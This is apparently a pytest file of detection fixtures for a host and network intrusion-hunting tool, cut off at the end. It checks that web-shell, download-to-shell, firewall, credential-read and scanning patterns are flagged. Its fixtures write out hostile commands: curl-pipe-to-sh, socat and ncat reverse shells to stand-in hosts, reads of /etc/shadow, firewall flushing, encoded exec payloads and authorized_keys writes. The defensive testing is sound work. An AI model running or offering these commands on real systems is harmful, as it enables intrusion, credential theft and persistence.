"""Positive and adversarial-negative fixtures for every sweep playbook. Addresses are documentation ranges."""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect import host, network
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv

T0 = datetime(2024, 11, 18, 14, 30, tzinfo=UTC)
_n = 0


def ev(family="process_exec", outcome=Outcome.success, host_name="web01", ts=None, **fields):
    global _n
    _n += 1
    f = {k.replace("__", "."): fv(v, f"fixture{_n}:{k}") for k, v in fields.items()}
    return TypedEvent(id=f"e{_n}", family=family, ts=ts or T0, host=host_name, outcome=outcome, fields=f,
                      raw=[RawRef(target="fx", native_id=f"r{_n}")], normalizer="fixture")


def run(pb_cls, events):
    pb = pb_cls()
    out = pb.consume(events)
    return out + pb.finalize()


def exec_ev(argv, user="root", outcome=Outcome.success, **kw):
    return ev(process__argv=argv, process__user=user, outcome=outcome, **kw)


# ---------------------------------------------------------------- web service spawns interpreter
def test_web_user_shell_is_found():
    m = run(host.WebServiceSpawnsInterpreter, [exec_ev(["/bin/sh", "-c", "id"], user="www-data")])
    assert len(m) == 1 and "www-data" in m[0].claim and m[0].confidence == "high"
    assert m[0].proposed_lane == "lead"          # rare, but no typed indicator


def test_web_user_routine_shapes_collapse_and_injection_escalates():
    # a scheduled helper: 50 runs spread across the afternoon
    routine = [exec_ev(["sh", "-c", "/usr/bin/zmdc.pl check"], user="www-data", ts=T0 + timedelta(minutes=7 * i))
               for i in range(50)]
    injected = exec_ev(["sh", "-c", "/usr/bin/zmu -A -a -m ;echo payload | python3 -"], user="www-data")
    stdin_shell = exec_ev(["/bin/sh"], user="www-data")
    m = run(host.WebServiceSpawnsInterpreter, routine + [injected, stdin_shell])
    assert sum(1 for x in m if x.proposed_lane == "context") == 1           # 50 routine runs -> 1 context item
    # command chaining after an application helper: high
    assert next(x for x in m if "zmu" in x.claim).proposed_lane == "high"
    # web account running an interpreter that reads commands from stdin: RCE-shaped -> urgent
    stdin_item = next(x for x in m if "(argv: /bin/sh)" in x.claim)
    assert stdin_item.proposed_lane == "urgent" and stdin_item.severity == "critical"


def test_common_stdin_shell_shape_keeps_every_indicator_event():
    events = [exec_ev(["/bin/sh"], user="www-data") for _ in range(6)]
    matches = run(host.WebServiceSpawnsInterpreter, events)
    assert len(matches) == 6
    assert all(match.proposed_lane == "urgent" and match.severity == "critical" for match in matches)
    assert all(match.events == [event] for match, event in zip(matches, events, strict=True))


@pytest.mark.parametrize("argv", [
    ["-bash"],
    ["-sh"],
    ["python3.12"],
])
def test_web_user_login_and_versioned_interpreter_names_are_normalized(argv):
    matches = run(host.WebServiceSpawnsInterpreter, [exec_ev(argv, user="www-data")])

    assert len(matches) == 1
    assert matches[0].proposed_lane == "urgent"
    assert matches[0].severity == "critical"


def test_indicator_after_shape_and_example_limits_is_not_hidden():
    prefix = "padding = 'this prefix is deliberately longer than forty eight characters'\n"
    benign_code = prefix + "print(padding)"
    indicator_code = prefix + "exec(__import__('base64').b64decode('cHJpbnQoMSk='))"
    events = [exec_ev(["python3", "-c", benign_code], user="www-data", ts=T0 + timedelta(minutes=15 * i))
              for i in range(20)]
    indicator_event = exec_ev(["python3", "-c", indicator_code], user="www-data")

    matches = run(host.WebServiceSpawnsInterpreter, events + [indicator_event])

    assert sorted(match.proposed_lane for match in matches) == ["context", "urgent"]
    urgent = next(match for match in matches if match.proposed_lane == "urgent")
    assert urgent.events == [indicator_event]
    assert any("decoded data" in note for note in urgent.notes)


def test_a_burst_of_one_web_shell_command_is_a_lead_not_routine_context():
    # An attacker looping the same command through a web shell: many runs, all within minutes.
    burst = [exec_ev(["sh", "-c", "cat /var/www/html/config.php"], user="www-data", ts=T0 + timedelta(seconds=10 * i))
             for i in range(30)]
    m = run(host.WebServiceSpawnsInterpreter, burst)
    assert [x.proposed_lane for x in m] == ["lead"] and "not spread across 3 or more hours" in m[0].claim
    assert "30 times" in m[0].claim and len(m[0].events) == 20 and "The earliest 20 runs are cited" in m[0].claim


def test_a_burst_straddling_hour_boundaries_is_still_a_lead():
    # 61 minutes from 10:59:30 touches three clock hours; most runs fall in one hour, so it is not a schedule.
    start = datetime(2024, 11, 18, 10, 59, 30, tzinfo=UTC)
    burst = [exec_ev(["sh", "-c", "cat /var/www/html/config.php"], user="www-data", ts=start + timedelta(seconds=10 * i))
             for i in range(370)]
    assert [x.proposed_lane for x in run(host.WebServiceSpawnsInterpreter, burst)] == ["lead"]


@pytest.mark.parametrize("argv", [
    ["ufw", "disable"],
    ["iptables", "-F"],
    ["iptables", "-P", "INPUT", "ACCEPT"],
    ["iptables", "-I", "INPUT", "-p", "tcp", "--dport", "4444", "-j", "ACCEPT"],
    ["iptables", "-D", "INPUT", "-p", "tcp", "--dport", "22", "-j", "DROP"],
    ["nft", "flush", "ruleset"],
])
def test_commands_that_weaken_the_firewall_are_leads_even_once(argv):
    m = run(host.FirewallRuleChange, [exec_ev(argv)])
    assert [x.proposed_lane for x in m] == ["lead"] and "weakens the host firewall" in m[0].claim


def test_a_specific_address_unblock_stays_a_direct_high_finding():
    m = run(host.FirewallRuleChange, [exec_ev(["iptables", "-D", "INPUT", "-s", "192.0.2.7", "-j", "DROP"])])
    assert [x.proposed_lane for x in m] == ["high"] and "remove a DROP rule for 192.0.2.7" in m[0].claim


def test_python_decoded_exec_indicator_is_parsed_not_substring():
    from romulus.detect.host import interpreter_indicators
    assert interpreter_indicators(["python3", "-c", "exec(__import__('base64').b64decode('cHJpbnQoMSk='))"])
    assert not interpreter_indicators(["python3", "-c", "print('exec b64decode is just text here')"])


@pytest.mark.parametrize("argv", [
    ["bash", "-c", "--", "id"],
    ["bash", "-c", "-x", "id"],
    ["bash", "-o", "pipefail", "-c", "id"],
    ["busybox", "sh", "-c", "id"],
])
def test_web_user_ambiguous_shell_script_is_unevaluable_but_only_a_rarity_lead(argv):
    pb = host.WebServiceSpawnsInterpreter()

    immediate = pb.consume([exec_ev(argv, user="www-data")])
    final = pb.finalize()

    assert immediate == []
    assert pb.missing_required == 1
    assert len(final) == 1 and final[0].proposed_lane == "lead"
    assert final[0].notes == ["rare shape without typed indicators"]


def test_web_user_unmodelled_shell_syntax_is_unevaluable_not_an_indicator():
    pb = host.WebServiceSpawnsInterpreter()

    immediate = pb.consume([
        exec_ev(["bash", "-c", "x=$(curl http://192.0.2.7/x | sh)"], user="www-data"),
    ])
    final = pb.finalize()

    assert immediate == []
    assert pb.missing_required == 1
    assert len(final) == 1 and final[0].proposed_lane == "lead"
    assert all("could not be parsed" not in note for note in final[0].notes)


def test_web_user_partial_script_prefix_can_supply_positive_chaining_indicator():
    pb = host.WebServiceSpawnsInterpreter()
    argv = [
        "sh", "-c",
        (r"/usr/bin/zmu -A -a -m ;echo exec\(__import__\(\'zlib\'\).decompress\(payload\)\)"
         "\n" r"exec $(which python || which python3) -"),
    ]

    immediate = pb.consume([exec_ev(argv, user="www-data")])

    assert len(immediate) == 1 and immediate[0].proposed_lane == "high"
    assert pb.missing_required == 1
    assert "indicator: additional commands chained after application helper 'zmu'" in immediate[0].notes
    assert any("clean prefix only" in note for note in immediate[0].notes)


@pytest.mark.parametrize("script", [
    '/usr/bin/zmu -m 0; echo b64decode; echo "unterminated',
    "/usr/bin/zmu -m 0; echo b64decode '",
    "/usr/bin/zmu -m 0; echo b64decode; x=$(id",
    "/usr/bin/zmu a; echo b64decode )",
    "/usr/bin/zmu a; echo b64decode; }",
    "/usr/bin/zmu a; echo b64decode |",
    "/usr/bin/zmu a && echo b64decode &&",
    "/usr/bin/zmu a; echo b64decode; esac",
    "/usr/bin/zmu a; echo b64decode; then",
    "/usr/bin/zmu a; echo b64decode; echo $'x",
    "/usr/bin/zmu a; python3 -c 'exec(base64.b64decode(\"aWQ=\"))' ${",
    "/usr/bin/zmu a; echo b64decode `id",
    "/usr/bin/zmu a; echo b64decode; case x in",
    "/usr/bin/zmu a; echo b64decode <(id",
    "/usr/bin/zmu a;echo b64decode;function",
    "/usr/bin/zmu a; echo b64decode; if true; then id",
    "/usr/bin/zmu a; echo b64decode; (id",
    "/usr/bin/zmu a; echo b64decode;; id",
    "/usr/bin/zmu a |\necho b64decode",
])
def test_rejected_shell_line_never_supplies_interpreter_indicators(script):
    indicators, unevaluable, prefix_only = host._interpreter_indicators(["bash", "-c", script])

    assert indicators == []
    assert unevaluable is True
    assert prefix_only is False


def test_lexical_cut_on_later_line_can_use_the_completed_prior_line():
    indicators, unevaluable, prefix_only = host._interpreter_indicators([
        "bash", "-c", "/usr/bin/zmu a; echo b64decode\necho $HOME",
    ])

    assert "additional commands chained after application helper 'zmu'" in indicators
    assert "encoded payload text piped/echoed into another command" in indicators
    assert unevaluable is True
    assert prefix_only is True


def test_web_user_partial_prefix_does_not_read_chaining_text_after_unclosed_construct():
    pb = host.WebServiceSpawnsInterpreter()
    argv = ["sh", "-c", '/usr/bin/zmu -A -a -m "$(echo x; /bin/evil']

    immediate = pb.consume([exec_ev(argv, user="www-data")])
    final = pb.finalize()

    assert immediate == []
    assert pb.missing_required == 1
    assert len(final) == 1 and final[0].proposed_lane == "lead"
    assert final[0].notes == ["rare shape without typed indicators"]


# ---------------------------------------------------------------- downloader feeds interpreter (sequence)
def test_downloader_and_stdin_shell_with_same_parent():
    d = exec_ev(["curl", "http://192.0.2.7/README.txt.1"], process__ppid=500)
    s = exec_ev(["sh"], process__ppid=500, ts=T0 + timedelta(seconds=0.2))
    m = run(host.DownloaderFeedsInterpreter, [d, s])
    assert len(m) == 1 and "inferred" in m[0].claim and len(m[0].events) == 2


@pytest.mark.parametrize("other", [
    {"argv": ["sh"], "ppid": 501, "dt": 0.2},                    # different parent
    {"argv": ["sh"], "ppid": 500, "dt": 60},                     # too far apart
    {"argv": ["sh", "/opt/job.sh"], "ppid": 500, "dt": 0.2},     # shell running a script file
])
def test_downloader_sequence_negatives(other):
    d = exec_ev(["curl", "http://192.0.2.7/x"], process__ppid=500)
    s = exec_ev(other["argv"], process__ppid=other["ppid"], ts=T0 + timedelta(seconds=other["dt"]))
    assert run(host.DownloaderFeedsInterpreter, [d, s]) == []


def test_downloader_recurring_pairs_collapse_with_cadence():
    evs = []
    for k in range(5):
        t = T0 + timedelta(minutes=15 * k)
        evs += [exec_ev(["curl", "http://192.0.2.7/TODO.md"], process__ppid=100 + k, ts=t),
                exec_ev(["sh"], process__ppid=100 + k, ts=t + timedelta(milliseconds=5))]
    m = run(host.DownloaderFeedsInterpreter, evs)
    assert len(m) == 1 and "occurred 5 times" in m[0].claim and "15.0-minute" in m[0].claim


def test_candidate_ids_are_scoped_per_hunt():
    from romulus.decide.policy import decide
    m = run(host.CredentialStoreRead, [exec_ev(["cat", "/etc/shadow"])])[0]
    assert decide(m, "h1").candidate_id != decide(m, "h2").candidate_id
    assert decide(m, "h1").candidate_id == decide(m, "h1").candidate_id


def test_downloader_sequence_spans_partitions():
    pb = host.DownloaderFeedsInterpreter()
    pb.consume([exec_ev(["wget", "http://192.0.2.7/x"], process__ppid=7)])
    pb.consume([exec_ev(["bash"], process__ppid=7, ts=T0 + timedelta(seconds=1))])
    assert len(pb.finalize()) == 1


@pytest.mark.parametrize("argv", [["-bash"], ["python3.12"]])
def test_downloader_sequence_normalizes_interpreter_name(argv):
    downloader = exec_ev(["curl", "http://192.0.2.7/x"], process__ppid=7)
    interpreter = exec_ev(argv, process__ppid=7, ts=T0 + timedelta(seconds=1))

    assert len(run(host.DownloaderFeedsInterpreter, [downloader, interpreter])) == 1


@pytest.mark.parametrize("argv,user", [
    (["/bin/sh", "-c", "id"], "root"),                      # not a web account
    (["/usr/bin/zmu", "-m", "1"], "www-data"),              # web user, non-interpreter helper
    (["grep", "bash", "/var/log/apache2/access.log"], "www-data"),  # tool name as an argument
])
def test_web_user_negatives(argv, user):
    assert run(host.WebServiceSpawnsInterpreter, [exec_ev(argv, user=user)]) == []


@pytest.mark.parametrize("pb_cls", [cls for cls in host.HOST_PLAYBOOKS if "process.argv" in cls.required_fields])
def test_empty_argv_is_missing_not_a_crash(pb_cls):
    # regression: real audit data contains execs with argc=0
    pb = pb_cls()
    pb.consume([ev(process__argv=[], process__user="www-data", process__ppid=1)])
    pb.finalize()
    assert pb.missing_required == 1


def test_missing_user_field_is_counted_not_matched():
    pb = host.WebServiceSpawnsInterpreter()
    assert pb.consume([ev(process__argv=["/bin/sh", "-c", "id"])]) == []
    assert pb.missing_required == 1 and pb.evaluated == 0


# ---------------------------------------------------------------- download piped to shell
def test_download_pipe_to_shell_found_and_wording_is_restrained():
    m = run(host.DownloadPipedToShell, [exec_ev(["/bin/sh", "-c", "curl http://192.0.2.7/TODO.md | sh"])])
    assert len(m) == 1 and m[0].proposed_lane == "urgent"
    assert "not established" in m[0].claim


def test_download_pipe_recognizes_versioned_interpreter_name():
    matches = run(
        host.DownloadPipedToShell,
        [exec_ev(["/bin/sh", "-c", "curl http://192.0.2.7/x | python3.12"])],
    )

    assert len(matches) == 1


@pytest.mark.parametrize("argv", [
    ["grep", "curl | sh", "/home/user/notes.txt"],                     # mention as grep pattern
    ["/bin/sh", "-c", "echo 'curl http://x | sh' >> README.md"],      # mention inside quoted echo text
    ["/bin/sh", "-c", "curl -o /tmp/x http://192.0.2.7/x; sha256sum /tmp/x"],  # download, no pipe to shell
    ["/bin/sh", "-c", "cat /etc/hosts | grep curl"],                  # pipe, but not downloader->shell
    ["vim", "/usr/share/awffull/awffull"],                             # editing the file is not running it
])
def test_download_pipe_negatives(argv):
    assert run(host.DownloadPipedToShell, [exec_ev(argv)]) == []


def test_quoted_pipe_is_not_a_download_pipeline():
    argv = ["/bin/sh", "-c", 'echo x; curl "|" sh']
    assert run(host.DownloadPipedToShell, [exec_ev(argv)]) == []


def test_newline_delimited_download_pipeline_is_detected():
    argv = ["/bin/sh", "-c", "cd /tmp\ncurl http://192.0.2.7/a | sh"]
    assert len(run(host.DownloadPipedToShell, [exec_ev(argv)])) == 1


@pytest.mark.parametrize("script", [
    "cat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF",
    r"echo usage: \; curl http://e/i \| sh",
    "apt-get update # then; curl http://e | sh",
])
def test_shell_data_is_not_a_download_pipeline(script):
    assert run(host.DownloadPipedToShell, [exec_ev(["bash", "-c", script])]) == []


@pytest.mark.parametrize("argv", [
    ["bash", "-c", "--", "curl http://192.0.2.7/x | sh"],
    ["bash", "-c", "-x", "curl http://192.0.2.7/x | sh"],
    ["bash", "-o", "pipefail", "-c", "curl http://192.0.2.7/x | sh"],
    ["busybox", "sh", "-c", "curl http://192.0.2.7/x | sh"],
    ["bash", "-s", "-c", "curl http://192.0.2.7/x | sh"],
    ["sh", "-es", "-c", "curl http://192.0.2.7/x | sh"],
    ["bash", "-s", "-x", "-c", "curl http://192.0.2.7/x | sh"],
    ["busybox", "sh", "-s", "-c", "curl http://192.0.2.7/x | sh"],
    ["zsh", "-s", "-c", "curl http://192.0.2.7/x | sh"],
])
@pytest.mark.parametrize("pb_cls", [host.DownloadPipedToShell, host.AuthorizedKeysWrite])
def test_ambiguous_shell_script_makes_direct_rule_unevaluable(pb_cls, argv):
    pb = pb_cls()

    assert pb.consume([exec_ev(argv)]) == []
    assert pb.missing_required == 1


# ---------------------------------------------------------------- python pty spawn
def test_pty_spawn_found():
    m = run(host.PtyUpgrade, [exec_ev(["python3", "-c", 'import pty;pty.spawn("/bin/bash")'])])
    assert len(m) == 1


@pytest.mark.parametrize("argv", [
    ["python3", "-c", "print('pty.spawn is documented here')"],   # string literal mention
    ["python3", "/opt/tools/pty_spawn_notes.py"],                 # filename mention
    ["grep", "-r", "pty.spawn", "/usr/lib/python3"],              # search
])
def test_pty_negatives(argv):
    assert run(host.PtyUpgrade, [exec_ev(argv)]) == []


# ---------------------------------------------------------------- exec from temp
def test_exec_from_tmp_requires_process_executable_instead_of_inferring_argv0():
    playbook = host.ExecFromTempDir()

    assert playbook.consume([
        exec_ev(["/tmp/linpeas.sh"], process__cwd="/tmp"),
    ]) == []
    assert playbook.missing_required == 1


def test_exec_from_tmp_direct_match_marks_missing_executable_unevaluable():
    playbook = host.ExecFromTempDir()

    assert playbook.match(exec_ev(["/tmp/linpeas.sh"])) == []
    assert playbook.missing_required == 1


def test_exec_from_tmp_ignores_script_operands_when_executable_is_not_temp():
    playbook = host.ExecFromTempDir()

    assert playbook.consume([
        exec_ev(["bash", "/tmp/x.sh"], process__executable="/usr/bin/bash", process__cwd="/tmp"),
    ]) == []
    assert playbook.missing_required == 0


@pytest.mark.parametrize("argv,cwd,expected", [
    (["/bin/sh", "./linpeas.sh"], "/tmp", "/tmp/linpeas.sh"),
    (["python3", "x.py"], "/tmp", "/tmp/x.py"),
    (["perl", "/tmp/x.pl"], "/", "/tmp/x.pl"),
    (["awk", "-v", "x=1", "-F", ":", "-f", "/tmp/x.awk"], "/", "/tmp/x.awk"),
])
def test_script_from_tmp_flags_only_a_modelled_interpreter_operand(argv, cwd, expected):
    matches = run(host.ScriptFromTempDir, [
        exec_ev(argv, process__executable=f"/usr/bin/{host.interpreter_name(argv[0])}", process__cwd=cwd),
    ])

    assert len(matches) == 1
    assert matches[0].claim_type == "script_content"
    assert f"temp-directory script operand '{expected}'" in matches[0].claim
    assert "whether that script ran is not established" in matches[0].claim


def test_script_from_tmp_keeps_lab_relative_shell_operand_lead():
    m = run(host.ScriptFromTempDir, [exec_ev(["/bin/sh", "./linpeas.sh"], process__cwd="/tmp")])
    assert len(m) == 1 and "temp-directory script operand '/tmp/linpeas.sh'" in m[0].claim


@pytest.mark.parametrize("executable,expected", [
    ("/tmp/tools/../linpeas.sh", "/tmp/linpeas.sh"),
    ("/etc/../tmp/x", "/tmp/x"),
])
def test_exec_from_tmp_normalizes_kernel_executable_path(executable, expected):
    matches = run(host.ExecFromTempDir, [exec_ev(["ignored"], process__executable=executable)])

    assert len(matches) == 1
    assert f"process.executable '{expected}'" in matches[0].claim


@pytest.mark.parametrize("argv,cwd", [
    (["./x"], None),
    (["x"], None),
    (["linpeas.sh"], "/tmp"),
    (["ls", "-la"], "/tmp"),
    (["-bash"], "/tmp"),
    (["x"], "/root"),
])
def test_exec_from_tmp_missing_executable_is_unevaluable(argv, cwd):
    playbook = host.ExecFromTempDir()
    extra = {"process__cwd": cwd} if cwd else {}

    assert playbook.consume([exec_ev(argv, **extra)]) == []
    assert playbook.missing_required == 1


def test_exec_from_tmp_absolute_non_temp_path_needs_no_cwd():
    playbook = host.ExecFromTempDir()

    assert playbook.consume([exec_ev(["id"], process__executable="/usr/bin/id")]) == []
    assert playbook.missing_required == 0


def test_exec_from_tmp_collapses_double_leading_slash():
    matches = run(host.ExecFromTempDir, [exec_ev(["x"], process__executable="//tmp/x")])

    assert len(matches) == 1
    assert "process.executable '/tmp/x'" in matches[0].claim


@pytest.mark.parametrize("argv,cwd,expected", [
    (["bash", "//tmp/x.sh"], "/root", "/tmp/x.sh"),
    (["bash", "x.sh"], "//tmp", "/tmp/x.sh"),
])
def test_script_from_tmp_collapses_double_leading_slash(argv, cwd, expected):
    matches = run(host.ScriptFromTempDir, [exec_ev(argv, process__cwd=cwd)])

    assert len(matches) == 1
    assert f"script operand '{expected}'" in matches[0].claim


@pytest.mark.parametrize("argv,executable", [
    (["nc", "10.0.0.5", "4444"], "/usr/bin/nc"),
    (["ncat", "evil.example", "443"], "/usr/bin/ncat"),
    (["netcat", "10.0.0.5", "4444"], "/usr/bin/netcat"),
    (["socat", "TCP:192.0.2.1:80", "EXEC:/bin/sh"], "/usr/bin/socat"),
    (["awk", "{print $1}", "/etc/passwd"], "/usr/bin/awk"),
    (["awk", "/tmp/ {print}", "input"], "/usr/bin/awk"),
    (["gawk", "/tmp/ {print}", "input"], "/usr/bin/gawk"),
])
def test_script_from_tmp_does_not_treat_data_operands_as_scripts(argv, executable):
    playbook = host.ScriptFromTempDir()

    assert playbook.consume([
        exec_ev(argv, process__executable=executable, process__cwd="/tmp"),
    ]) == []
    assert playbook.missing_required == 0


@pytest.mark.parametrize("name", ["awk", "gawk"])
def test_script_from_tmp_awk_uses_only_dash_f_script_operand(name):
    matches = run(host.ScriptFromTempDir, [
        exec_ev([name, "-f", "/tmp/tool.awk"], process__executable=f"/usr/bin/{name}", process__cwd="/"),
    ])

    assert len(matches) == 1
    assert "script operand '/tmp/tool.awk'" in matches[0].claim


@pytest.mark.parametrize("argv", [
    ["awk", "{print}", "-f", "/tmp/data"],
    ["awk", "--", "{print}", "-f", "/tmp/data"],
])
def test_script_from_tmp_awk_stops_option_scan_before_late_dash_f(argv):
    playbook = host.ScriptFromTempDir()

    assert playbook.consume([
        exec_ev(argv, process__executable="/usr/bin/awk", process__cwd="/"),
    ]) == []
    assert playbook.missing_required == 0


@pytest.mark.parametrize("argv,cwd", [
    (["cat", "/tmp/report.txt"], "/home/user"),        # temp path as argument only
    (["./build.sh"], "/home/user/src"),                # relative exec outside temp
])
def test_script_from_tmp_negatives(argv, cwd):
    assert run(host.ScriptFromTempDir, [exec_ev(argv, process__cwd=cwd)]) == []


# ---------------------------------------------------------------- firewall change
def test_firewall_block_found_and_sudo_wrapper_not_double_counted():
    wrapper = exec_ev(["sudo", "iptables", "-A", "INPUT", "-s", "192.0.2.65", "-j", "DROP"])
    child = exec_ev(["iptables", "-A", "INPUT", "-s", "192.0.2.65", "-j", "DROP"])
    m = run(host.FirewallRuleChange, [wrapper, child])
    assert len(m) == 1 and "add a DROP rule for 192.0.2.65 on the INPUT chain" in m[0].claim
    assert "took effect is not" in m[0].claim and m[0].proposed_lane == "high"


def test_unclassified_firewall_changes_are_one_aggregated_lead_never_context():
    evs = [exec_ev(["/sbin/iptables", "-w", "-A", "fooX1998", "-p", "tcp", "-j", "ACCEPT"]) for _ in range(30)]
    m = run(host.FirewallRuleChange, evs)
    assert len(m) == 1 and m[0].proposed_lane == "lead" and "30 other" in m[0].claim
    assert "whether they weaken protection is not established" in m[0].claim and len(m[0].events) == 10


@pytest.mark.parametrize("argv", [
    ["iptables", "-L", "-n"],                          # list only
    ["iptables-save"],                                 # dump only
    ["man", "iptables"],                               # documentation
    ["grep", "-A", "5", "iptables", "/etc/rc.local"],  # -A belongs to grep
])
def test_firewall_negatives(argv):
    assert run(host.FirewallRuleChange, [exec_ev(argv)]) == []


# ---------------------------------------------------------------- credential store read
def test_shadow_read_found():
    assert len(run(host.CredentialStoreRead, [exec_ev(["cat", "/etc/shadow"])])) == 1


@pytest.mark.parametrize("argv", [
    ["grep", "shadow", "/etc/nsswitch.conf"],
    ["ls", "-l", "/etc/shadow"],              # metadata, not content read
    ["cat", "/etc/shadow.bak.txt"],           # different path
    ["man", "shadow"],
])
def test_shadow_negatives(argv):
    assert run(host.CredentialStoreRead, [exec_ev(argv)]) == []


def test_failed_read_is_medium_confidence():
    m = run(host.CredentialStoreRead, [exec_ev(["cat", "/etc/shadow"], outcome=Outcome.failure)])
    assert m[0].confidence == "medium" and "failed" in m[0].claim


# ---------------------------------------------------------------- authorized_keys write
def test_authorized_keys_append_found():
    m = run(host.AuthorizedKeysWrite,
            [exec_ev(["/bin/sh", "-c", "echo ssh-ed25519 AAAA x >> /root/.ssh/authorized_keys"])])
    assert len(m) == 1


@pytest.mark.parametrize("argv", [
    ["cat", "/root/.ssh/authorized_keys"],                              # read
    ["/bin/sh", "-c", "grep -c ssh- /root/.ssh/authorized_keys"],       # read in a script
    ["/bin/sh", "-c", "echo 'see ~/.ssh/authorized_keys' > notes.txt"],  # mention in text
])
def test_authorized_keys_negatives(argv):
    assert run(host.AuthorizedKeysWrite, [exec_ev(argv)]) == []


def test_quoted_redirect_is_not_an_authorized_keys_write():
    argv = ["/bin/sh", "-c", 'grep -c ">" /root/.ssh/authorized_keys']
    assert run(host.AuthorizedKeysWrite, [exec_ev(argv)]) == []


def test_heredoc_body_is_not_an_authorized_keys_write_command():
    script = "cat > /tmp/README <<EOF\necho key >> /root/.ssh/authorized_keys\nEOF"

    assert run(host.AuthorizedKeysWrite, [exec_ev(["bash", "-c", script])]) == []


# ---------------------------------------------------------------- ssh login external
def _auth(ip, outcome=Outcome.success, service="sshd"):
    return ev(family="auth", outcome=outcome, auth__service=service, source__ip=ip, user__name="admin")


def test_ssh_external_success_grouped():
    m = run(host.SshLoginFromExternal, [_auth("203.0.113.9"), _auth("203.0.113.9"), _auth("10.0.0.5")])
    assert len(m) == 1 and "2 successful" in m[0].claim


def test_ssh_failed_and_private_ignored():
    assert run(host.SshLoginFromExternal, [_auth("203.0.113.9", Outcome.failure), _auth("192.168.1.4")]) == []


# ---------------------------------------------------------------- suricata alert stack
def _alert(sev, cat="Web Application Attack", src="198.51.100.4", t=T0):
    return ev(family="net_alert", ts=t, alert__signature="ET TEST sig", alert__signature_id=1, alert__severity=sev,
              alert__category=cat, source__ip=src, destination__ip="192.0.2.10")


def test_alert_lanes_by_severity_and_category():
    m = run(network.SuricataAlertStack, [_alert(1), _alert(1), _alert(2, src="198.51.100.5"),
                                         _alert(3, cat="Not Suspicious Traffic", src="198.51.100.6")])
    lanes = sorted(x.proposed_lane for x in m)
    assert lanes == ["context", "high", "lead"]
    high = next(x for x in m if x.proposed_lane == "high")
    assert "raised 2 " in high.claim and "not proof" in high.claim


def test_many_signatures_from_one_scanner_are_one_item():
    evs = []
    for i in range(300):
        e = _alert(1)
        e.fields["alert.signature_id"].value = i
        e.fields["alert.signature"].value = f"ET WEB sig {i}"
        evs.append(e)
    m = run(network.SuricataAlertStack, evs)
    assert len(m) == 1 and "300 distinct signature(s)" in m[0].claim


def test_alert_signature_note_is_deterministic_when_names_match():
    evs = []
    for signature_id in range(30):
        e = _alert(1)
        e.fields["alert.signature_id"].value = signature_id
        e.fields["alert.signature"].value = "ET TEST repeated name"
        evs.append(e)

    match = run(network.SuricataAlertStack, evs)[0]

    expected = sorted(range(30), key=str)
    assert match.notes[-1] == f"signatures: {expected}"


# ---------------------------------------------------------------- web scan burst (cross-partition)
def test_scan_burst_counted_across_partitions():
    pb = network.WebScanBurst()
    batch1 = [ev(family="http_access", source__ip="198.51.100.4", http__response__status_code=404,
                 url__original=f"/a{i}", ts=T0 + timedelta(seconds=i)) for i in range(150)]
    batch2 = [ev(family="http_access", source__ip="198.51.100.4", http__response__status_code=404,
                 url__original=f"/b{i}", ts=T0 + timedelta(minutes=20, seconds=i)) for i in range(150)]
    pb.consume(batch1)
    pb.consume(batch2)                       # neither batch alone reaches the threshold
    m = pb.finalize()
    assert len(m) == 1 and "300 HTTP requests" in m[0].claim


def test_scan_burst_ignores_normal_traffic():
    evs = [ev(family="http_access", source__ip="192.0.2.50", http__response__status_code=200,
              url__original="/zm/index.php") for _ in range(500)]
    assert run(network.WebScanBurst, evs) == []


# ---------------------------------------------------------------- dns enumeration
def test_dns_enumeration():
    evs = [ev(family="dns_query", source__ip="198.51.100.4", dns__question__name=f"h{i}.example.test", dns__type="query")
           for i in range(120)]
    m = run(network.DnsSubdomainEnumeration, evs)
    assert len(m) == 1 and "120 distinct names" in m[0].claim


def test_dns_repeated_same_name_is_not_enumeration():
    evs = [ev(family="dns_query", source__ip="192.0.2.5", dns__question__name="www.example.test") for _ in range(500)]
    assert run(network.DnsSubdomainEnumeration, evs) == []


# ---------------------------------------------------------------- port scan
def test_port_scan():
    evs = [ev(family="net_flow", source__ip="198.51.100.4", destination__ip="192.0.2.10", destination__port=p)
           for p in range(1, 101)]
    assert len(run(network.PortScan, evs)) == 1


def test_many_flows_to_few_ports_is_not_scan():
    evs = [ev(family="net_flow", source__ip="192.0.2.5", destination__ip="192.0.2.10", destination__port=443)
           for _ in range(500)]
    assert run(network.PortScan, evs) == []


def test_script_from_tmp_via_interpreter_script():
    m = run(host.ScriptFromTempDir, [exec_ev(["/bin/sh", "./linpeas.sh", "-s"], process__cwd="/tmp")])
    assert len(m) == 1 and "interpreter 'sh'" in m[0].claim
    # sh -c with a script string is not a script file
    assert run(host.ScriptFromTempDir, [exec_ev(["/bin/sh", "-c", "./x"], process__cwd="/tmp")]) == []


def test_script_from_tmp_normalizes_login_shell_name():
    matches = run(host.ScriptFromTempDir, [exec_ev(["-bash", "/tmp/x.sh"])])

    assert len(matches) == 1
    assert "interpreter 'bash'" in matches[0].claim


@pytest.mark.parametrize("argv", [
    ["bash", "/tmp/x.sh", "-c"],
    ["bash", "/tmp/x.sh", "-recursive"],
])
def test_script_from_tmp_stops_shell_option_scan_at_script_file(argv):
    matches = run(host.ScriptFromTempDir, [exec_ev(argv)])

    assert len(matches) == 1
    assert "interpreter 'bash'" in matches[0].claim
    assert "script operand '/tmp/x.sh'" in matches[0].claim


@pytest.mark.parametrize("argv", [
    ["bash", "-o", "pipefail", "/tmp/x.sh"],
    ["bash", "+x", "/tmp/x.sh"],
    ["bash", "-O", "extglob", "/tmp/x.sh"],
    ["bash", "--init-file", "/etc/bashrc", "/tmp/x.sh"],
    ["busybox", "sh", "/tmp/x.sh"],
])
def test_script_from_tmp_consumes_shell_options_and_busybox_applet(argv):
    matches = run(host.ScriptFromTempDir, [exec_ev(argv)])

    assert len(matches) == 1
    assert "'/tmp/x.sh'" in matches[0].claim


@pytest.mark.parametrize("argv", [
    ["bash", "-s", "/tmp/x.sh"],
    ["bash", "-es", "/tmp/x.sh"],
    ["bash", "-se", "/tmp/x.sh"],
    ["busybox", "sh", "-s", "/tmp/x.sh"],
])
def test_script_from_tmp_ignores_arguments_after_shell_stdin_option(argv):
    playbook = host.ScriptFromTempDir()

    assert playbook.consume([
        exec_ev(argv, process__executable=f"/bin/{argv[0]}", process__cwd="/"),
    ]) == []
    assert playbook.missing_required == 0


@pytest.mark.parametrize("argv", [
    ["python3", "-W", "ignore", "/tmp/x.py"],
    ["python3", "+X", "/tmp/x.py"],
])
def test_script_from_tmp_non_shell_option_layout_produces_no_positive(argv):
